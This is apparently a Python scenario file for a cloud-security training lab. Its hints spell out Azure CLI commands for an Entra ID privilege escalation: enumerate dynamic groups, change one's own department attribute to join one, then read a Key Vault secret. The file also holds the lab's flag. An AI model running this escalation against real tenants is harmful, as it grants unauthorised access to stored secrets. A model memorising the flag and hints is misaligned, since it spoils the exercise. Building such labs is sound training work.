from cumulonimbus.providers.base.application_configuration import ApplicationConfigurationAbstract


class ApplicationConfiguration(ApplicationConfigurationAbstract):
    mitre_ttps = [
        {"id": "T1098", "name": "Account Manipulation", "url": "https://attack.mitre.org/techniques/T1098/"},
        {"id": "T1069.003", "name": "Permission Groups Discovery: Cloud Groups", "url": "https://attack.mitre.org/techniques/T1069/003/"},
        {"id": "T1078.004", "name": "Valid Accounts: Cloud Accounts", "url": "https://attack.mitre.org/techniques/T1078/004/"},
        {"id": "T1552", "name": "Unsecured Credentials", "url": "https://attack.mitre.org/techniques/T1552/"},
    ]

    def configure_application(self, **kwargs):
        pass

    def get_difficulty(self):
        return "Intermediate"

    def get_hints(self):
        return {
            1: "You have the 'User Account Administrator' Entra ID role. Enumerate groups in the tenant and look for a dynamic security group — its membership is controlled by a rule based on user attributes: az rest --method GET --uri 'https://graph.microsoft.com/v1.0/groups?$select=displayName,membershipRule,membershipRuleProcessingState'",
            2: "The dynamic group's rule evaluates user.department. Update your own department attribute to match: az rest --method PATCH --uri 'https://graph.microsoft.com/v1.0/me' --body '{\"department\": \"Security\"}'. Dynamic group membership typically updates within 1-5 minutes.",
            3: "Once you are a member of the group, it grants Key Vault Secrets User access. Read the flag: az keyvault secret show --vault-name <vault_name> --name flag --query value -o tsv",
        }

    def get_flag(self):
        return "CUMULONIMBUS{Dyn4m1c_Gr0up_M3mb3rsh1p_Abus3d}"

    def pretty_print_tf_output(self, app_id, output):
        if not output:
            return
        print("###############################################")
        print("#             Required Information            #")
        print("###############################################")
        print("[1] Tenant domain      : " + output["domain_name"]["value"])
        print("[2] Attacker username  : " + output["user_name"]["value"])
        print("[3] Attacker password  : " + output["user_password"]["value"])
        print("[4] Key Vault name     : " + output["key_vault_name"]["value"])
        print("[5] Dynamic group      : " + output["group_name"]["value"])
        print("")
        print("Start here:")
        print("  az login -u '{}' -p '<password>'".format(output["user_name"]["value"]))
        print("  az rest --method GET --uri \\")
        print("    'https://graph.microsoft.com/v1.0/groups?$select=displayName,membershipRule,membershipRuleProcessingState'")
        self.print_mitre_ttps()
